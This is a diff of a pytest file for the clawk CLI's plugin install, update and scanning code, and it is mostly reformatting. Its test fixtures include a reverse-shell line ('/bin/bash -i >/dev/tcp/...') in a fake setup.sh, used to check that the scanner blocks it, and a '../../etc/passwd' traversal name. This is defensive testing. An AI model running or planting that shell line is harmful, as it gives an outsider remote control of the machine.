@@ -29,28 +29,53 @@ def _write_portable_app_plugin(root: Path, app: Path) -> None:
     from clawk_cli.agent_plugins import MCP_SCHEMA_V1, PLUGIN_SCHEMA_V1
     from clawk_platform.host.facts import os_family
 
-    (root / "plugin.json").write_text(json.dumps({
-        "$schema": PLUGIN_SCHEMA_V1,
-        "name": "example-plugin",
-        "extensions": {"com.nousresearch.clawk": {"servers": {"worker": {
-            "app": {os_family(): {"presence": "executable", "location": str(app)}},
-            "requires": {"app": True},
-        }}}},
-    }), encoding="utf-8")
-    (root / "mcp.json").write_text(json.dumps({
-        "$schema": MCP_SCHEMA_V1,
-        "mcpServers": {"worker": {"type": "stdio", "command": "python"}},
-    }), encoding="utf-8")
+    (root / "plugin.json").write_text(
+        json.dumps(
+            {
+                "$schema": PLUGIN_SCHEMA_V1,
+                "name": "example-plugin",
+                "extensions": {
+                    "com.nousresearch.clawk": {
+                        "servers": {
+                            "worker": {
+                                "app": {
+                                    os_family(): {
+                                        "presence": "executable",
+                                        "location": str(app),
+                                    }
+                                },
+                                "requires": {"app": True},
+                            }
+                        }
+                    }
+                },
+            }
+        ),
+        encoding="utf-8",
+    )
+    (root / "mcp.json").write_text(
+        json.dumps(
+            {
+                "$schema": MCP_SCHEMA_V1,
+                "mcpServers": {"worker": {"type": "stdio", "command": "python"}},
+            }
+        ),
+        encoding="utf-8",
+    )
 
 
-def test_portable_install_gate_accepts_present_app_and_refuses_missing(tmp_path: Path) -> None:
+def test_portable_install_gate_accepts_present_app_and_refuses_missing(
+    tmp_path: Path,
+) -> None:
     app = tmp_path / "example-app"
     app.write_text("", encoding="utf-8")
     _write_portable_app_plugin(tmp_path, app)
 
     _refuse_unavailable_portable_plugin("example-plugin", tmp_path)
     app.unlink()
-    with pytest.raises(PluginOperationError, match="example-plugin.*worker.*missing_app"):
+    with pytest.raises(
+        PluginOperationError, match="example-plugin.*worker.*missing_app"
+    ):
         _refuse_unavailable_portable_plugin("example-plugin", tmp_path)
 
 
@@ -64,24 +89,11 @@ class TestSanitizePluginName:
         target = _sanitize_plugin_name("my-plugin", tmp_path)
         assert target == (tmp_path / "my-plugin").resolve()
 
-
     def test_rejects_dot_dot(self, tmp_path):
         with pytest.raises(ValueError, match="must not contain"):
             _sanitize_plugin_name("../../etc/passwd", tmp_path)
 
-
-
-
-
-
-
     # ── allow_subdir=True ──
-
-
-
-
-
-
 
 
 # ── _resolve_git_url ──────────────────────────────────────────────────────
@@ -90,16 +102,10 @@ class TestSanitizePluginName:
 class TestResolveGitUrl:
     """Shorthand and full-URL resolution, with optional subdirectory."""
 
-
-
-
-
     def test_url_with_fragment_subdir(self):
         url, subdir = _resolve_git_url("https://github.com/owner/repo.git#my-plugin")
         assert url == "https://github.com/owner/repo.git"
         assert subdir == "my-plugin"
-
-
 
     @pytest.mark.parametrize(
         "identifier",
@@ -126,13 +132,10 @@ class TestResolveGitUrl:
 class TestResolveSubdirWithin:
     """Subdirectory resolution stays within the clone and rejects traversal."""
 
-
     def test_valid_nested_subdir(self, tmp_path):
         (tmp_path / "a" / "b" / "c").mkdir(parents=True)
         result = _resolve_subdir_within(tmp_path, "a/b/c")
         assert result == (tmp_path / "a" / "b" / "c").resolve()
-
-
 
     def test_rejects_symlink_escape(self, tmp_path):
         clone = tmp_path / "clone"
@@ -147,8 +150,6 @@ class TestResolveSubdirWithin:
 # ── _resolve_git_executable ─────────────────────────────────────────────────
 
 
-
-
 class TestGitPullPluginDirAutostash:
     """Real-git E2E: local edits in a plugin checkout must not block updates."""
 
@@ -157,7 +158,13 @@ class TestGitPullPluginDirAutostash:
         import subprocess as sp
 
         def git(cwd, *args):
-            r = sp.run(["git", *args], cwd=str(cwd), capture_output=True, text=True, check=False)
+            r = sp.run(
+                ["git", *args],
+                cwd=str(cwd),
+                capture_output=True,
+                text=True,
+                check=False,
+            )
             assert r.returncode == 0, r.stderr
             return r.stdout
 
@@ -202,7 +209,7 @@ class TestGitPullPluginDirAutostash:
         ok, msg = pc._git_pull_plugin_dir(checkout)
         assert ok is True
         content = (checkout / "plugin.py").read_text(encoding="utf-8")
-        assert "VALUE = 2" in content        # update landed
+        assert "VALUE = 2" in content  # update landed
         assert "OTHER = 'local'" in content  # local edit survived
         assert "re-applied" in msg
         # Clean re-apply drops the autostash entry.
@@ -261,7 +268,9 @@ class TestGitPullPluginDirAutostash:
         assert "Already up to date" in msg
         assert git(checkout, "stash", "list").strip() == ""
 
-    def test_autostash_addresses_git_by_sha_never_brace_selector(self, tmp_path, monkeypatch):
+    def test_autostash_addresses_git_by_sha_never_brace_selector(
+        self, tmp_path, monkeypatch
+    ):
         """Native Windows: MSYS strips the braces from ``stash@{0}`` in git.exe's argv, so the
         apply and the drop must target the autostash by its commit sha / positionally (#87542)."""
         import clawk_cli.plugins_cmd as pc
@@ -285,7 +294,9 @@ class TestGitPullPluginDirAutostash:
 
         assert ok is True and "re-applied" in msg
         assert git(checkout, "stash", "list").strip() == ""
-        assert not any("{" in arg or "}" in arg for args in argv_log for arg in args), argv_log
+        assert not any("{" in arg or "}" in arg for args in argv_log for arg in args), (
+            argv_log
+        )
         applied = [args for args in argv_log if args[:2] == ("stash", "apply")]
         assert len(applied) == 1 and len(applied[0][2]) == 40, applied  # by commit sha
 
@@ -302,8 +313,6 @@ class TestRepoNameFromUrl:
         )
 
 
-
-
 # ── plugins_command dispatch ──────────────────────────────────────────────
 
 
@@ -312,7 +321,6 @@ class TestRepoNameFromUrl:
 
 class TestReadManifest:
     """Manifest reading edge cases."""
-
 
     def test_missing_file_returns_empty(self, tmp_path):
         result = _read_manifest(tmp_path)
@@ -392,7 +400,6 @@ class TestCmdInstall:
 class TestCmdUpdate:
     """Test the update command."""
 
-
     @patch("clawk_cli.plugins_cmd._sanitize_plugin_name")
     @patch("clawk_cli.plugins_cmd._plugins_dir")
     def test_update_plugin_not_found(self, mock_plugins_dir, mock_sanitize):
@@ -416,7 +423,6 @@ class TestCmdUpdate:
 
 class TestCmdRemove:
     """Test the remove command."""
-
 
     @patch("clawk_cli.plugins_cmd._sanitize_plugin_name")
     @patch("clawk_cli.plugins_cmd._plugins_dir")
@@ -466,10 +472,7 @@ class TestCmdRemove:
         assert sibling.read_text(encoding="utf-8") == "name: keep\n"
 
 
-
 # ── cmd_list tests ─────────────────────────────────────────────────────────
-
-
 
 
 # ── _copy_example_files tests ─────────────────────────────────────────────────
@@ -492,7 +495,6 @@ class TestCopyExampleFiles:
         # Should have created the file
         assert (tmp_path / "config.yaml").exists()
         console.print.assert_called()
-
 
     def test_handles_copy_error_gracefully(self, tmp_path):
         from unittest.mock import MagicMock, patch
@@ -518,9 +520,6 @@ class TestCopyExampleFiles:
 class TestPromptPluginEnvVars:
     """Tests for _prompt_plugin_env_vars."""
 
-
-
-
     def test_prompts_for_missing_var_rich_format(self):
         from clawk_cli.plugins_cmd import _prompt_plugin_env_vars
         from unittest.mock import MagicMock, patch
@@ -538,9 +537,11 @@ class TestPromptPluginEnvVars:
             ],
         }
 
-        with patch("clawk_cli.config.get_env_value", return_value=None), \
-             patch("builtins.input", return_value="pk-lf-123"), \
-             patch("clawk_cli.config.save_env_value") as mock_save:
+        with (
+            patch("clawk_cli.config.get_env_value", return_value=None),
+            patch("builtins.input", return_value="pk-lf-123"),
+            patch("clawk_cli.config.save_env_value") as mock_save,
+        ):
             _prompt_plugin_env_vars(manifest, console)
 
         mock_save.assert_called_once_with("LANGFUSE_PUBLIC_KEY", "pk-lf-123")
@@ -558,14 +559,16 @@ class TestPromptPluginEnvVars:
             "requires_env": [{"name": "SECRET_KEY", "secret": True}],
         }
 
-        with patch("clawk_cli.config.get_env_value", return_value=None), \
-             patch("clawk_cli.plugins_cmd.masked_secret_prompt", return_value="s3cret") as mock_prompt, \
-             patch("clawk_cli.config.save_env_value"):
+        with (
+            patch("clawk_cli.config.get_env_value", return_value=None),
+            patch(
+                "clawk_cli.plugins_cmd.masked_secret_prompt", return_value="s3cret"
+            ) as mock_prompt,
+            patch("clawk_cli.config.save_env_value"),
+        ):
             _prompt_plugin_env_vars(manifest, console)
 
         mock_prompt.assert_called_once()
-
-
 
 
 # ── curses_radiolist ─────────────────────────────────────────────────────
@@ -576,6 +579,7 @@ class TestCursesRadiolist:
 
     def test_non_tty_returns_default(self):
         from clawk_cli.curses_ui import curses_radiolist
+
         with patch("sys.stdin") as mock_stdin:
             mock_stdin.isatty.return_value = False
             result = curses_radiolist("Pick one", ["a", "b", "c"], selected=1)
@@ -588,31 +592,30 @@ class TestCursesRadiolist:
 class TestProviderDiscovery:
     """Test provider plugin discovery and config helpers."""
 
-
-
     def test_save_context_engine(self, tmp_path, monkeypatch):
         """Saving a context engine persists to config.yaml."""
         monkeypatch.setenv("CLAWK_HOME", str(tmp_path))
         config_file = tmp_path / "config.yaml"
         config_file.write_text("context:\n  engine: compressor\n", encoding="utf-8")
         from clawk_cli.plugins_cmd import _save_context_engine
+
         _save_context_engine("lcm")
         content = yaml.safe_load(config_file.read_text(encoding="utf-8"))
         assert content["context"]["engine"] == "lcm"
 
-
     def test_discover_context_engines_empty(self):
         """Discovery returns empty list when import fails."""
-        with patch("plugins.context_engine.discover_context_engines",
-                    side_effect=ImportError("no module")):
+        with patch(
+            "plugins.context_engine.discover_context_engines",
+            side_effect=ImportError("no module"),
+        ):
             from clawk_cli.plugins_cmd import _discover_context_engines
+
             result = _discover_context_engines()
             assert result == []
 
 
 # ── Auto-activation fix ──────────────────────────────────────────────────
-
-
 
 
 # ── End-to-end subdirectory install ──────────────────────────────────────────
@@ -717,15 +720,29 @@ class TestSubdirInstallE2E:
         self._make_repo_with_subdir_plugin(repo_root)
         plugins_dir = tmp_path / "home/plugins"
         monkeypatch.setenv("CLAWK_HOME", str(plugins_dir.parent))
-        target, _manifest, _name = pc._install_plugin_core(f"file://{repo_root}#my-plugin", force=False)
+        target, _manifest, _name = pc._install_plugin_core(
+            f"file://{repo_root}#my-plugin", force=False
+        )
         assert not (target / ".git").exists()
 
-        (repo_root / "my-plugin" / "__init__.py").write_text("VERSION = 2\n", encoding="utf-8")
-        env = {**os.environ, "GIT_AUTHOR_NAME": "t", "GIT_AUTHOR_EMAIL": "t@t",
-               "GIT_COMMITTER_NAME": "t", "GIT_COMMITTER_EMAIL": "t@t"}
+        (repo_root / "my-plugin" / "__init__.py").write_text(
+            "VERSION = 2\n", encoding="utf-8"
+        )
+        env = {
+            **os.environ,
+            "GIT_AUTHOR_NAME": "t",
+            "GIT_AUTHOR_EMAIL": "t@t",
+            "GIT_COMMITTER_NAME": "t",
+            "GIT_COMMITTER_EMAIL": "t@t",
+        }
         sp.run(["git", "commit", "-qam", "v2"], cwd=repo_root, check=True, env=env)
-        new_sha = sp.run(["git", "rev-parse", "HEAD"], cwd=repo_root, check=True,
-                         capture_output=True, text=True).stdout.strip()
+        new_sha = sp.run(
+            ["git", "rev-parse", "HEAD"],
+            cwd=repo_root,
+            check=True,
+            capture_output=True,
+            text=True,
+        ).stdout.strip()
 
         output = _pull_plugin_update(target, lambda rec: "pinned", lambda: "not git")
 
@@ -733,7 +750,9 @@ class TestSubdirInstallE2E:
         assert pc._read_install_metadata()["my-plugin"]["revision"] == new_sha
         assert "Already up to date" not in output
         # A second update with nothing new upstream reports up to date, like `git pull`.
-        assert "Already up to date" in _pull_plugin_update(target, lambda rec: "pinned", lambda: "not git")
+        assert "Already up to date" in _pull_plugin_update(
+            target, lambda rec: "pinned", lambda: "not git"
+        )
 
     def test_installs_portable_root_package_disabled(self, tmp_path, monkeypatch):
         if shutil.which("git") is None:
@@ -758,7 +777,9 @@ class TestSubdirInstallE2E:
         }
         sp.run(["git", "init", "-q"], cwd=repo_root, check=True, env=env)
         sp.run(["git", "add", "-A"], cwd=repo_root, check=True, env=env)
-        sp.run(["git", "commit", "-q", "-m", "init"], cwd=repo_root, check=True, env=env)
+        sp.run(
+            ["git", "commit", "-q", "-m", "init"], cwd=repo_root, check=True, env=env
+        )
         plugins_dir = tmp_path / "home/plugins"
         monkeypatch.setenv("CLAWK_HOME", str(plugins_dir.parent))
 
@@ -776,7 +797,6 @@ class TestSubdirInstallE2E:
         """Publish through an isolated PM home, not the developer's active environment."""
 
 
-
 @pytest.mark.usefixtures("prepared_publication")
 class TestReviewedPinScanTrust:
     """A caution-verdict tree installs without a prompt when it is the reviewed catalog pin, still
@@ -787,7 +807,9 @@ class TestReviewedPinScanTrust:
     def _fake_clone(self, pc, monkeypatch, plugins_dir, extra_file, body):
         def fake_clone(tmp_clone, git_url, revision, subdir=None):
             tmp_clone.mkdir()
-            (tmp_clone / "plugin.yaml").write_text("name: scanme\nmanifest_version: 1\n", encoding="utf-8")
+            (tmp_clone / "plugin.yaml").write_text(
+                "name: scanme\nmanifest_version: 1\n", encoding="utf-8"
+            )
             (tmp_clone / extra_file).write_text(body, encoding="utf-8")
             return revision or "b" * 40
 
@@ -800,14 +822,24 @@ class TestReviewedPinScanTrust:
 
         plugins_dir = tmp_path / "plugins"
         plugins_dir.mkdir()
-        self._fake_clone(pc, monkeypatch, plugins_dir, "helper.py", "eval('1 + 1')\n")  # caution
+        self._fake_clone(
+            pc, monkeypatch, plugins_dir, "helper.py", "eval('1 + 1')\n"
+        )  # caution
 
         with pytest.raises(pc.PluginScanBlocked):
             pc._install_plugin_core("https://github.com/o/r", force=False)
-        with pytest.raises(pc.PluginScanBlocked):  # catalog install whose checkout is NOT the pin
-            pc._install_plugin_core("https://github.com/o/r", force=False, ref="c" * 40, reviewed_pin=self.SHA)
+        with pytest.raises(
+            pc.PluginScanBlocked
+        ):  # catalog install whose checkout is NOT the pin
+            pc._install_plugin_core(
+                "https://github.com/o/r",
+                force=False,
+                ref="c" * 40,
+                reviewed_pin=self.SHA,
+            )
         target, _manifest, name = pc._install_plugin_core(
-            "https://github.com/o/r", force=False, ref=self.SHA, reviewed_pin=self.SHA)
+            "https://github.com/o/r", force=False, ref=self.SHA, reviewed_pin=self.SHA
+        )
         assert name == "scanme" and target.is_dir()
 
     def test_dangerous_blocks_even_at_the_reviewed_sha(self, tmp_path, monkeypatch):
@@ -815,10 +847,21 @@ class TestReviewedPinScanTrust:
 
         plugins_dir = tmp_path / "plugins"
         plugins_dir.mkdir()
-        self._fake_clone(pc, monkeypatch, plugins_dir, "setup.sh", "/bin/bash -i >/dev/tcp/1.2.3.4/4444 0>&1\n")
+        self._fake_clone(
+            pc,
+            monkeypatch,
+            plugins_dir,
+            "setup.sh",
+            "/bin/bash -i >/dev/tcp/1.2.3.4/4444 0>&1\n",
+        )
 
         with pytest.raises(pc.PluginScanBlocked):
-            pc._install_plugin_core("https://github.com/o/r", force=False, ref=self.SHA, reviewed_pin=self.SHA)
+            pc._install_plugin_core(
+                "https://github.com/o/r",
+                force=False,
+                ref=self.SHA,
+                reviewed_pin=self.SHA,
+            )
 
 
 @pytest.mark.usefixtures("prepared_publication")
@@ -826,11 +869,15 @@ class TestInstallReadabilityGate:
     """A clone that lands unreadable is repaired or rolled back, never shipped (#111804)."""
 
     def _clone_with_unreadable_manifest(self, monkeypatch, pc):
-        real_chmod = os.chmod  # the rollback test replaces os.chmod after this fixture runs
+        real_chmod = (
+            os.chmod
+        )  # the rollback test replaces os.chmod after this fixture runs
 
         def fake_clone(tmp_clone, git_url, revision, subdir=None):
             tmp_clone.mkdir()
-            (tmp_clone / "plugin.yaml").write_text("name: badperm\nmanifest_version: 1\n", encoding="utf-8")
+            (tmp_clone / "plugin.yaml").write_text(
+                "name: badperm\nmanifest_version: 1\n", encoding="utf-8"
+            )
             real_chmod(tmp_clone / "plugin.yaml", 0)
             return "0" * 40
 
@@ -838,7 +885,9 @@ class TestInstallReadabilityGate:
         monkeypatch.setattr(pc, "_scan_plugin_tree", lambda *a, **k: None)
 
     @pytest.mark.platforms("posix")
-    @pytest.mark.skipif(getattr(os, "geteuid", lambda: 1)() == 0, reason="root ignores mode bits")
+    @pytest.mark.skipif(
+        getattr(os, "geteuid", lambda: 1)() == 0, reason="root ignores mode bits"
+    )
     def test_unreadable_file_is_repaired_before_install(self, tmp_path, monkeypatch):
         from clawk_cli import plugins_cmd as pc
 
@@ -850,23 +899,39 @@ class TestInstallReadabilityGate:
         target, _manifest, name = pc._install_plugin_core("file:///tmp/x", force=False)
 
         assert name == "badperm"  # manifest read after repair, not the URL fallback
-        assert (target / "plugin.yaml").read_text(encoding="utf-8").startswith("name: badperm")
+        assert (
+            (target / "plugin.yaml")
+            .read_text(encoding="utf-8")
+            .startswith("name: badperm")
+        )
 
     @pytest.mark.platforms("posix")
-    @pytest.mark.skipif(getattr(os, "geteuid", lambda: 1)() == 0, reason="root ignores mode bits")
-    def test_unrepairable_tree_rolls_back_and_names_the_fix(self, tmp_path, monkeypatch):
+    @pytest.mark.skipif(
+        getattr(os, "geteuid", lambda: 1)() == 0, reason="root ignores mode bits"
+    )
+    def test_unrepairable_tree_rolls_back_and_names_the_fix(
+        self, tmp_path, monkeypatch
+    ):
         from clawk_cli import plugins_cmd as pc
 
         plugins_dir = tmp_path / "plugins"
         plugins_dir.mkdir()
         monkeypatch.setattr(pc, "_plugins_dir", lambda: plugins_dir)
         self._clone_with_unreadable_manifest(monkeypatch, pc)
-        monkeypatch.setattr(pc.os, "chmod", lambda *a, **k: (_ for _ in ()).throw(PermissionError(1, "nope")))
+        monkeypatch.setattr(
+            pc.os,
+            "chmod",
+            lambda *a, **k: (_ for _ in ()).throw(PermissionError(1, "nope")),
+        )
 
-        with pytest.raises(PluginOperationError, match=r"plugin.yaml is not readable.*chmod -R u\+rX"):
+        with pytest.raises(
+            PluginOperationError, match=r"plugin.yaml is not readable.*chmod -R u\+rX"
+        ):
             pc._install_plugin_core("file:///tmp/x", force=False)
 
-        assert list(plugins_dir.iterdir()) == []  # no half-installed dir, no staging leftovers
+        assert (
+            list(plugins_dir.iterdir()) == []
+        )  # no half-installed dir, no staging leftovers
 
 
 def test_portable_manifest_is_visible_to_plugin_cli(tmp_path):
@@ -927,11 +992,15 @@ def test_autostash_dirty_tree_promotes_intent_to_add_entries(tmp_path):
     stashed, error = _autostash_dirty_tree("git", tmp_path)
 
     assert error == "", "the plugin autostash must not be blocked by i-t-a entries"
-    assert stashed == git("rev-parse", "refs/stash").stdout.strip()  # the autostash commit sha
+    assert (
+        stashed == git("rev-parse", "refs/stash").stdout.strip()
+    )  # the autostash commit sha
     assert git("status", "--porcelain").stdout == ""
 
 
-def test_toggle_plugin_toolset_rewrites_a_list_literal_string_platform_entry(tmp_path, monkeypatch):
+def test_toggle_plugin_toolset_rewrites_a_list_literal_string_platform_entry(
+    tmp_path, monkeypatch
+):
     """``clawk plugins enable`` must reach a platform whose ``platform_toolsets`` entry is the
     list-literal string an older ``clawk config set`` stored, and re-save it as a real list —
     the runtime already reads that string as the user's selection (follow-up to #115866)."""
@@ -940,17 +1009,31 @@ def test_toggle_plugin_toolset_rewrites_a_list_literal_string_platform_entry(tmp
 
     monkeypatch.setenv("CLAWK_HOME", str(tmp_path))
     (tmp_path / "config.yaml").write_text(
-        yaml.safe_dump({"platform_toolsets": {"cli": '["web", "terminal"]', "telegram": ["clawk-telegram"]}}),
-        encoding="utf-8")
-    monkeypatch.setattr(plugins_cmd, "_get_plugin_toolset_key", lambda name: "my-plugin")
+        yaml.safe_dump(
+            {
+                "platform_toolsets": {
+                    "cli": '["web", "terminal"]',
+                    "telegram": ["clawk-telegram"],
+                }
+            }
+        ),
+        encoding="utf-8",
+    )
+    monkeypatch.setattr(
+        plugins_cmd, "_get_plugin_toolset_key", lambda name: "my-plugin"
+    )
 
     plugins_cmd._toggle_plugin_toolset("my-plugin", enable=True)
-    saved = yaml.safe_load((tmp_path / "config.yaml").read_text(encoding="utf-8"))["platform_toolsets"]
+    saved = yaml.safe_load((tmp_path / "config.yaml").read_text(encoding="utf-8"))[
+        "platform_toolsets"
+    ]
     assert saved["cli"] == ["web", "terminal", "my-plugin"]
     assert saved["telegram"] == ["clawk-telegram", "my-plugin"]
 
     plugins_cmd._toggle_plugin_toolset("my-plugin", enable=False)
-    saved = yaml.safe_load((tmp_path / "config.yaml").read_text(encoding="utf-8"))["platform_toolsets"]
+    saved = yaml.safe_load((tmp_path / "config.yaml").read_text(encoding="utf-8"))[
+        "platform_toolsets"
+    ]
     assert saved["cli"] == ["web", "terminal"]
 
 
@@ -962,8 +1045,11 @@ def prepared_publication(client, tmp_path, monkeypatch):
 def test_default_compressor_does_not_activate_an_offered_plugin(monkeypatch):
     from agent.agent_init import _select_context_engine
     from types import SimpleNamespace
-    candidate = SimpleNamespace(name='offered', clone_for_agent=lambda: candidate)
-    monkeypatch.setattr('plugins.context_engine.load_context_engine', lambda _: None)
-    monkeypatch.setattr('clawk_cli.plugins.get_plugin_context_engine', lambda: candidate)
-    assert _select_context_engine({'context': {'engine': 'compressor'}}) is None
-    assert _select_context_engine({'context': {'engine': 'offered'}}).name == 'offered'
+
+    candidate = SimpleNamespace(name="offered", clone_for_agent=lambda: candidate)
+    monkeypatch.setattr("plugins.context_engine.load_context_engine", lambda _: None)
+    monkeypatch.setattr(
+        "clawk_cli.plugins.get_plugin_context_engine", lambda: candidate
+    )
+    assert _select_context_engine({"context": {"engine": "compressor"}}) is None
+    assert _select_context_engine({"context": {"engine": "offered"}}).name == "offered"
